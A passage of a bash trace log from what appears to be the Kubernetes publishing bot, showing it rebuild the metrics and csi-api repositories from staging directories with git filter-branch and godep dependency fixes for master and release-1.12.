/go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '1c28ee7 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12.  Deleting CHANGELOG-1.11.md' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=1c28ee79e274169ac14e83bc0348939d22a13556\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.12.sh\n>\t+ [[ -z } ]]\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>[05 Sep 18 17:51 UTC]: Successfully constructed release-1.12\n>[05 Sep 18 17:51 UTC]: Successfully ensured /go-workspace/src/k8s.io/csi-api exists\n>[05 Sep 18 17:51 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[05 Sep 18 17:51 UTC]: /publish_scripts/construct.sh csi-api master master apimachinery:master,api:master,client-go:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\" \n>\t+ '[' '!' 13 -eq 13 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tFetching from origin.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master /go-workspace/src/k8s.io/kubernetes/.git apimachinery:master,api:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tdfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit dfbb6007401672afff31c7a0209f72d87fdeb09e.\n>\t+ echo 'Starting at existing master commit dfbb6007401672afff31c7a0209f72d87fdeb09e.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 2c933695fa61d57d1c6fa5defb89caed7d49f773.\n>\t+ echo 'Checked out source commit 2c933695fa61d57d1c6fa5defb89caed7d49f773.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ '[' -z 416f63c050d01fe831d532d89e29d01093d9c127 ']'\n>\t++ git-find-merge 416f63c050d01fe831d532d89e29d01093d9c127 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list '416f63c050d01fe831d532d89e29d01093d9c127^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 416f63c050d01fe831d532d89e29d01093d9c127..upstream/master --ancestry-path\n>\t+++ git rev-parse 416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ local k_base_merge=416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ '[' -z 416f63c050d01fe831d532d89e29d01093d9c127 ']'\n>\t+ git branch -f filtered-branch-base 416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\tRunning git filter-branch ...\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=b74ceea99142028a0c5ef646843b48e189360e61\n>\t++ git log --first-parent --format=%H --reverse b74ceea99142028a0c5ef646843b48e189360e61..HEAD\n>\tChecking out branch master.\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' dfbb6007401672afff31c7a0209f72d87fdeb09e '!=' dfbb6007401672afff31c7a0209f72d87fdeb09e ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ '[' -z 416f63c050d01fe831d532d89e29d01093d9c127 ']'\n>\t++ git-find-merge 416f63c050d01fe831d532d89e29d01093d9c127 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '416f63c050d01fe831d532d89e29d01093d9c127^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 416f63c050d01fe831d532d89e29d01093d9c127..upstream-branch --ancestry-path\n>\t+++ git rev-parse 416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ local k_last_kube_merge=416f63c050d01fe831d532d89e29d01093d9c127\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.'\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 416f63c050d01fe831d532d89e29d01093d9c127 ../kube-commits-apimachinery-master\n>\t+ '[' -z 6429050ef506887d121f3e7306e894f8900d8a63 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 6429050ef506887d121f3e7306e894f8900d8a63'\n>\tChecking out k8s.io/apimachinery to 6429050ef506887d121f3e7306e894f8900d8a63\n>\t+ git checkout -q 6429050ef506887d121f3e7306e894f8900d8a63\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.\n>\t++ look -b 416f63c050d01fe831d532d89e29d01093d9c127 ../kube-commits-api-master\n>\t+ '[' -z 012f271b5d41baad56190c5f1ae19bff16df0fd8 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 012f271b5d41baad56190c5f1ae19bff16df0fd8'\n>\tChecking out k8s.io/api to 012f271b5d41baad56190c5f1ae19bff16df0fd8\n>\t+ git checkout -q 012f271b5d41baad56190c5f1ae19bff16df0fd8\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.'\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 416f63c050d01fe831d532d89e29d01093d9c127.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 416f63c050d01fe831d532d89e29d01093d9c127 ../kube-commits-client-go-master\n>\tChecking out k8s.io/client-go to 37c3c02ec96533daec0dbda1f39a6b1d68505c79\n>\t+ '[' -z 37c3c02ec96533daec0dbda1f39a6b1d68505c79 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 37c3c02ec96533daec0dbda1f39a6b1d68505c79'\n>\t+ git checkout -q 37c3c02ec96533daec0dbda1f39a6b1d68505c79\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\tRunning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\tRemove redundant godep commits on-top of dfbb6007401672afff31c7a0209f72d87fdeb09e.\n>\t+ echo 'Remove redundant godep commits on-top of dfbb6007401672afff31c7a0209f72d87fdeb09e.'\n>\t+ git reset --soft -q dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ local repo=csi-api\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'dfbb600 Merge pull request #68159 from saad-ali/csiClusterRegFix' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-csi-api-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-csi-api-master.sh\n>\t+ [[ -z } ]]\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[05 Sep 18 17:52 UTC]: Successfully constructed master\n>[05 Sep 18 17:52 UTC]: /publish_scripts/construct.sh csi-api release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\" \n>\t+ '[' '!' 13 -eq 13 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q dfbb6007401672afff31c7a0209f72d87fdeb09e\n>\t+ git branch -D release-1.12\n>\terror: branch 'release-1.12' not found.\n>\t+ true\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tBranch origin/release-1.12 not found. Creating orphan release-1.12 branch.\n>\t+ echo 'Branch origin/release-1.12 not found. Creating orphan release-1.12 branch.'\n>\t+ git checkout -q --orphan release-1.12\n>\t+ git rm -q --ignore-unmatch -rf .\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api release-1.12 release-1.12 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t+ echo 'Found repo without release-1.12 branch, creating initial commit.'\n>\t+ git commit -m 'Initial commit' --allow-empty\n>\tFound repo without release-1.12 branch, creating initial commit.\n>\t[release-1.12 (root-commit) 1caef90] Initial commit\n>\t+ new_branch=true\n>\t+ orphan=true\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 2b32d1f55d387e1e183e56dd0897843894365ae1.\n>\t+ echo 'Checked out source commit 2b32d1f55d387e1e183e56dd0897843894365ae1.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' true = true ']'\n>\t+ '[' release-1.12 = master ']'\n>\t+ '[' true = true ']'\n>\t++ git-fork-point upstream/release-1.12 upstream/master\n>\t++ head -1\n>\t+++ git rev-list upstream/master --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list upstream/release-1.12 --first-parent\n>\t+ local k_branch_point_commit=d0439d417b0563d44c65b6e400e2070964dea7d1\n>\t+ '[' -z d0439d417b0563d44c65b6e400e2070964dea7d1 ']'\n>\t+ echo 'Using branch point d0439d417b0563d44c65b6e400e2070964dea7d1 as new starting point for new branch release-1.12.'\n>\tUsing branch point d0439d417b0563d44c65b6e400e2070964dea7d1 as new starting point for new branch release-1.12.\n>\t+ git branch -f filtered-branch-base d0439d417b0563d44c65b6e400e2070964dea7d1\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/csi-api.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\tRunning git filter-branch ...\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\tWARNING: Ref 'refs/heads/filtered-branch-base' is unchanged\n>\t++ kube-commit Kubernetes-commit filtered-branch-base\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 